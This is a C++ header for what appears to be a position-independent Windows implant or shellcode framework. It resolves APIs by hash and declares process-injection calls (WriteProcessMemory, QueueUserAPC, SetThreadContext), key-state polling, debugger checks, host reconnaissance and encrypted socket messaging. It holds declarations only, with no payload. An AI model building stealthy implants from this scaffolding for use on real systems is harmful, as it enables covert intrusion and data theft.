#ifndef COMMON_H
#define COMMON_H

#include <constexpr.h>
#include <macros.h>
#include <memory.h>
#include <native.h>
#include <resolve.h>

extern "C" auto entry(_In_ void* args) -> void;

extern "C" auto RipData() -> uintptr_t;

extern "C" auto RipEntry() -> uintptr_t;

#if defined(DEBUG)
#define DPRINT(format, ...)                                                    \
  {                                                                            \
    ntdll.DbgPrint(symbol<PCH>("%-48s " format), symbol<PCH>(({                \
                     char __buf[48];                                           \
                     memory::snprintf(__buf, sizeof(__buf), "[%s:%d]",         \
                                      __FUNCTION__, __LINE__);                 \
                     __buf;                                                    \
                   })),                                                        \
                   ##__VA_ARGS__);                                             \
  }
#define DPRINT_CTX(ctx, format, ...)                                           \
  {                                                                            \
    if ((ctx) && (ctx)->ntdll.DbgPrint) {                                      \
      (ctx)->ntdll.DbgPrint(symbol<PCH>("%-48s " format), symbol<PCH>(({       \
                              char __buf[48];                                  \
                              memory::snprintf(__buf, sizeof(__buf), "[%s:%d]",\
                                               __FUNCTION__, __LINE__);        \
                              __buf;                                           \
                            })),                                               \
                            ##__VA_ARGS__);                                    \
    }                                                                          \
  }
#else
#define DPRINT(format, ...)                                                    \
  {                                                                            \
    ;                                                                          \
  }
#define DPRINT_CTX(ctx, format, ...)                                           \
  {                                                                            \
    ;                                                                          \
  }
#endif
#define END_OFFSET 0x10

struct cpu_features_t {
	bool sse2;
	bool initialized;
};

declfn inline auto has_sse2() -> bool {
	static cpu_features_t features{ false, false };

	if (!features.initialized) [[unlikely]] {
		int cpuinfo[4];
		asm volatile("cpuid"
			: "=a"(cpuinfo[0]), "=b"(cpuinfo[1]), "=c"(cpuinfo[2]),
			"=d"(cpuinfo[3])
			: "a"(1), "c"(0));
		features.sse2 = (cpuinfo[3] & (1 << 26)) != 0;
		features.initialized = true;
	}
	return features.sse2;
}

namespace Crypto {
	template<typename T> inline T symbol(T s) {
		return reinterpret_cast<T> (RipData()) -
		(reinterpret_cast<uintptr_t> (&RipData) -
			reinterpret_cast<uintptr_t> (s));
	}

	class instance {
	public:
		struct {
			uintptr_t address;
			uintptr_t length;
		} base = {};

		struct {
			uintptr_t handle;
			struct {
				DECLARE_API (InitializeProcThreadAttributeList)
				DECLARE_API (UpdateProcThreadAttribute)
				DECLARE_API (DeleteProcThreadAttributeList)
			};
		} kernelbase{
				RESOLVE_TYPE (InitializeProcThreadAttributeList),
				RESOLVE_TYPE (UpdateProcThreadAttribute),
				RESOLVE_TYPE (DeleteProcThreadAttributeList)
				};
		struct {
			uintptr_t handle;

			struct {
				DECLARE_API (LoadLibraryA)
				DECLARE_API (GetProcAddress)
				DECLARE_API (VirtualAlloc)
				DECLARE_API (VirtualFree)
				DECLARE_API (VirtualProtect)
				DECLARE_API (VirtualQuery)
				DECLARE_API (VirtualAllocEx)
				DECLARE_API (VirtualFreeEx)
				DECLARE_API (VirtualProtectEx)
				DECLARE_API (CreateProcessA)
				DECLARE_API (WriteProcessMemory)
				DECLARE_API (QueueUserAPC)
				DECLARE_API (ResumeThread)
				DECLARE_API (CloseHandle)
				DECLARE_API (GetTickCount)
				DECLARE_API (ExitProcess)
				DECLARE_API (Sleep)
				DECLARE_API (GetThreadContext)
				DECLARE_API (SetThreadContext)
				DECLARE_API (IsDebuggerPresent)
				DECLARE_API (CreatePipe)
				DECLARE_API (ReadFile)
				DECLARE_API (WriteFile)
				DECLARE_API (BaseThreadInitThunk)
				DECLARE_API (SuspendThread)
				DECLARE_API (OpenThread)
				DECLARE_API (CreateThread)
				DECLARE_API (WaitForSingleObject)
				DECLARE_API (CreateEventA)
				DECLARE_API (SetEvent)
				DECLARE_API (GetCurrentProcessId)
				DECLARE_API (GetCurrentThreadId)
				DECLARE_API (RtlLookupFunctionEntry)
				DECLARE_API (GetCurrentProcess)
				DECLARE_API (GetCurrentThread)
				DECLARE_API (GetTickCount64)
				DECLARE_API (GetLastError)
				DECLARE_API (GetComputerNameA)
				DECLARE_API (CreateFileA)
				DECLARE_API (GetFileSize)
				DECLARE_API (GetModuleHandleA)
				DECLARE_API (HeapCreate)
				DECLARE_API (HeapAlloc)
				DECLARE_API (HeapDestroy)
				DECLARE_API (TerminateProcess)
				DECLARE_API (OpenProcess)
				DECLARE_API (GetExitCodeProcess)
				DECLARE_API (DuplicateHandle)
				DECLARE_API (ProcessIdToSessionId)
				DECLARE_API (SetCurrentDirectoryA)
				DECLARE_API (GetCurrentDirectoryA)
				DECLARE_API (GetCurrentDirectoryW)
				DECLARE_API (FindFirstFileA)
				DECLARE_API (FindNextFileA)
				DECLARE_API (FindClose)
				DECLARE_API (DeleteFileA)
				DECLARE_API (CopyFileA)
				DECLARE_API (MoveFileA)
				DECLARE_API (GetFileAttributesA)
				DECLARE_API (RemoveDirectoryA)
				DECLARE_API (CreateDirectoryA)
				DECLARE_API (ExpandEnvironmentStringsA)
				DECLARE_API (GetSystemInfo)
				DECLARE_API (CreateToolhelp32Snapshot)
				DECLARE_API (Process32First)
				DECLARE_API (Process32Next)
				DECLARE_API (GetFullPathNameW)
				DECLARE_API (GlobalMemoryStatusEx)
				DECLARE_API (GetSystemTime)
				DECLARE_API (GetLocalTime)
				DECLARE_API (GetSystemDirectoryA)
				DECLARE_API (GetDiskFreeSpaceExA)
				DECLARE_API (GetEnvironmentVariableA)
				DECLARE_API (GetLogicalDrives)
				DECLARE_API (GetDriveTypeA)
				DECLARE_API (GetVolumeInformationA)
				DECLARE_API (PeekNamedPipe)
				DECLARE_API (DisconnectNamedPipe)
				DECLARE_API (FreeLibrary)
				DECLARE_API (GetProcessHeap)
				DECLARE_API (HeapFree)
				DECLARE_API (QueryPerformanceCounter)
			};
		} kernel32 = { RESOLVE_TYPE (LoadLibraryA),
		               RESOLVE_TYPE (GetProcAddress),
		               RESOLVE_TYPE (VirtualAlloc),
		               RESOLVE_TYPE (VirtualFree),
		               RESOLVE_TYPE (VirtualProtect),
		               RESOLVE_TYPE (VirtualQuery),
		               RESOLVE_TYPE (VirtualAllocEx),
		               RESOLVE_TYPE (VirtualFreeEx),
		               RESOLVE_TYPE (VirtualProtectEx),
		               RESOLVE_TYPE (CreateProcessA),
		               RESOLVE_TYPE (WriteProcessMemory),
		               RESOLVE_TYPE (QueueUserAPC),
		               RESOLVE_TYPE (ResumeThread),
		               RESOLVE_TYPE (CloseHandle),
		               RESOLVE_TYPE (GetTickCount),
		               RESOLVE_TYPE (ExitProcess),
		               RESOLVE_TYPE (Sleep),
		               RESOLVE_TYPE (GetThreadContext),
		               RESOLVE_TYPE (SetThreadContext),
		               RESOLVE_TYPE (IsDebuggerPresent),
		               RESOLVE_TYPE (CreatePipe),
		               RESOLVE_TYPE (ReadFile),
		               RESOLVE_TYPE (WriteFile),
		               RESOLVE_TYPE (BaseThreadInitThunk),
		               RESOLVE_TYPE (SuspendThread),
		               RESOLVE_TYPE (OpenThread),
		               RESOLVE_TYPE (CreateThread),
		               RESOLVE_TYPE (WaitForSingleObject),
		               RESOLVE_TYPE (CreateEventA),
		               RESOLVE_TYPE (SetEvent),
		               RESOLVE_TYPE (GetCurrentProcessId),
		               RESOLVE_TYPE (GetCurrentThreadId),
		               RESOLVE_TYPE (RtlLookupFunctionEntry),
		               RESOLVE_TYPE (BaseThreadInitThunk),
		               RESOLVE_TYPE (GetCurrentProcess),
		               RESOLVE_TYPE (GetCurrentThread),
		               RESOLVE_TYPE (GetTickCount64),
		               RESOLVE_TYPE (GetLastError),
		               RESOLVE_TYPE (GetComputerNameA),
		               RESOLVE_TYPE (CreateFileA),
		               RESOLVE_TYPE (GetFileSize),
		               RESOLVE_TYPE (GetModuleHandleA),
		               RESOLVE_TYPE (HeapCreate),
		               RESOLVE_TYPE (HeapAlloc),
		               RESOLVE_TYPE (HeapDestroy),
		               RESOLVE_TYPE (TerminateProcess),
		               RESOLVE_TYPE (OpenProcess),
		               RESOLVE_TYPE (GetExitCodeProcess),
		               RESOLVE_TYPE (DuplicateHandle),
		               RESOLVE_TYPE (ProcessIdToSessionId),
		               RESOLVE_TYPE (SetCurrentDirectoryA),
		               RESOLVE_TYPE (GetCurrentDirectoryA),
		               RESOLVE_TYPE (GetCurrentDirectoryW),
		               RESOLVE_TYPE (FindFirstFileA),
		               RESOLVE_TYPE (FindNextFileA),
		               RESOLVE_TYPE (FindClose),
		               RESOLVE_TYPE (DeleteFileA),
		               RESOLVE_TYPE (CopyFileA),
		               RESOLVE_TYPE (MoveFileA),
		               RESOLVE_TYPE (GetFileAttributesA),
		               RESOLVE_TYPE (RemoveDirectoryA),
		               RESOLVE_TYPE (CreateDirectoryA),
		               RESOLVE_TYPE (ExpandEnvironmentStringsA),
		               RESOLVE_TYPE (GetSystemInfo),
		               RESOLVE_TYPE (CreateToolhelp32Snapshot),
		               RESOLVE_TYPE (Process32First),
		               RESOLVE_TYPE (Process32Next),
		               RESOLVE_TYPE (GetFullPathNameW),
		               RESOLVE_TYPE (GlobalMemoryStatusEx),
		               RESOLVE_TYPE (GetSystemTime),
		               RESOLVE_TYPE (GetLocalTime),
		               RESOLVE_TYPE (GetSystemDirectoryA),
		               RESOLVE_TYPE (GetDiskFreeSpaceExA),
		               RESOLVE_TYPE (GetEnvironmentVariableA),
		               RESOLVE_TYPE (GetLogicalDrives),
		               RESOLVE_TYPE (GetDriveTypeA),
		               RESOLVE_TYPE (GetVolumeInformationA),
		               RESOLVE_TYPE (PeekNamedPipe),
		               RESOLVE_TYPE (DisconnectNamedPipe),
		               RESOLVE_TYPE (FreeLibrary),
		               RESOLVE_TYPE (GetProcessHeap),
		               RESOLVE_TYPE (HeapFree),
				       RESOLVE_TYPE(QueryPerformanceCounter)};

		struct {
			uintptr_t handle;

			struct {
#ifdef DEBUG
				DECLARE_API (DbgPrint)
#endif
			};
		} ntdll = {
#ifdef DEBUG
				RESOLVE_TYPE (DbgPrint)
#endif
				};

		struct {
			uintptr_t handle;

			struct {
				DECLARE_API (MessageBoxA)
				DECLARE_API (GetAsyncKeyState)
				DECLARE_API (GetKeyState)
				DECLARE_API (GetCursorPos)
				DECLARE_API (SetCursorPos)
				DECLARE_API (GetDC)
				DECLARE_API (ReleaseDC)
				DECLARE_API (GetSystemMetrics)
				DECLARE_API (GetDesktopWindow)
				DECLARE_API (GetWindowRect)
			};
		} user32 = { RESOLVE_TYPE (MessageBoxA), RESOLVE_TYPE (GetAsyncKeyState),
		             RESOLVE_TYPE (GetKeyState), RESOLVE_TYPE (GetCursorPos),
		             RESOLVE_TYPE (SetCursorPos), RESOLVE_TYPE (GetDC),
		             RESOLVE_TYPE (ReleaseDC), RESOLVE_TYPE (GetSystemMetrics),
		             RESOLVE_TYPE (GetDesktopWindow), RESOLVE_TYPE (GetWindowRect) };

		struct {
			uintptr_t handle;

			struct {
				DECLARE_API (WSAStartup)
				DECLARE_API (WSACleanup)
				DECLARE_API (WSAGetLastError)
				DECLARE_API (socket)
				DECLARE_API (sendto)
				DECLARE_API (recvfrom)
				DECLARE_API (setsockopt)
				DECLARE_API (getsockopt)
				DECLARE_API (closesocket)
				DECLARE_API (bind)
				DECLARE_API (connect)
				DECLARE_API (listen)
				DECLARE_API (accept)
				DECLARE_API (recv)
				DECLARE_API (send)
				DECLARE_API (select)
				DECLARE_API (ioctlsocket)
				DECLARE_API (inet_addr)
				DECLARE_API (inet_ntoa)
				DECLARE_API (htons)
				DECLARE_API (ntohs)
				DECLARE_API (htonl)
				DECLARE_API (ntohl)
			};
		} ws2_32 = { RESOLVE_TYPE (WSAStartup),
		             RESOLVE_TYPE (WSACleanup),
		             RESOLVE_TYPE (WSAGetLastError),
		             RESOLVE_TYPE (socket),
		             RESOLVE_TYPE (sendto),
		             RESOLVE_TYPE (recvfrom),
		             RESOLVE_TYPE (setsockopt),
		             RESOLVE_TYPE (getsockopt),
		             RESOLVE_TYPE (closesocket),
		             RESOLVE_TYPE (bind),
		             RESOLVE_TYPE (connect),
		             RESOLVE_TYPE (listen),
		             RESOLVE_TYPE (accept),
		             RESOLVE_TYPE (recv),
		             RESOLVE_TYPE (send),
		             RESOLVE_TYPE (select),
		             RESOLVE_TYPE (ioctlsocket),
		             RESOLVE_TYPE (inet_addr),
		             RESOLVE_TYPE (inet_ntoa),
		             RESOLVE_TYPE (htons),
		             RESOLVE_TYPE (ntohs),
		             RESOLVE_TYPE (htonl),
		             RESOLVE_TYPE (ntohl) };



		struct {
			uintptr_t handle;
			struct {
				DECLARE_API (GetAdaptersInfo)
			};
		} iphlpapi = { RESOLVE_TYPE (GetAdaptersInfo) };

		struct {
			uintptr_t handle;
			struct {
				DECLARE_API (WinHttpOpen)
				DECLARE_API (WinHttpConnect)
				DECLARE_API (WinHttpOpenRequest)
				DECLARE_API (WinHttpSetOption)
				DECLARE_API (WinHttpSendRequest)
				DECLARE_API (WinHttpReceiveResponse)
				DECLARE_API (WinHttpQueryHeaders)
				DECLARE_API (WinHttpQueryDataAvailable)
				DECLARE_API (WinHttpReadData)
				DECLARE_API (WinHttpCloseHandle)
				DECLARE_API (WinHttpAddRequestHeaders)
				DECLARE_API (WinHttpSetTimeouts)
			};
		} winhttp = { RESOLVE_TYPE (WinHttpOpen),
		              RESOLVE_TYPE (WinHttpConnect),
		              RESOLVE_TYPE (WinHttpOpenRequest),
		              RESOLVE_TYPE (WinHttpSetOption),
		              RESOLVE_TYPE (WinHttpSendRequest),
		              RESOLVE_TYPE (WinHttpReceiveResponse),
		              RESOLVE_TYPE (WinHttpQueryHeaders),
		              RESOLVE_TYPE (WinHttpQueryDataAvailable),
		              RESOLVE_TYPE (WinHttpReadData),
		              RESOLVE_TYPE (WinHttpCloseHandle),
		              RESOLVE_TYPE (WinHttpAddRequestHeaders),
		              RESOLVE_TYPE (WinHttpSetTimeouts) };



		bool is_running = false;

		auto print_hex(instance* ctx, const char* label, const uint8_t* data, size_t len) -> void;
		auto demo_prng(instance* ctx) -> void;
		auto demo_sha256(instance* ctx) -> void;
		auto demo_x25519(instance* ctx) -> void;
		auto demo_chacha20_poly1305(instance* ctx) -> void;
		auto send_encrypted(instance*   ctx, uintptr_t socket, const uint8_t* key, const uint8_t* nonce_base,
		                    uint64_t*   counter,
		                    const char* message) -> bool;
		auto recv_encrypted(instance* ctx, uintptr_t socket, const uint8_t* key, char* message, size_t max_len) -> int;


		declfn instance();


		declfn auto start(_In_ void* args) -> void;
	};

	template<typename T = char> auto declfn hash_string(_In_ const T* string) -> uint32_t {
		uint32_t hash = 0x811c9dc5;
		uint8_t  byte = 0;
		while (*string) {
			byte = static_cast<uint8_t> (*string++);
			if (byte >= 'a') { byte -= 0x20; }
			hash ^= byte;
			hash *= 0x01000193;
		}
		return hash;
	}
}

#define STRING(str) Crypto::symbol<const char *>(str)
#endif
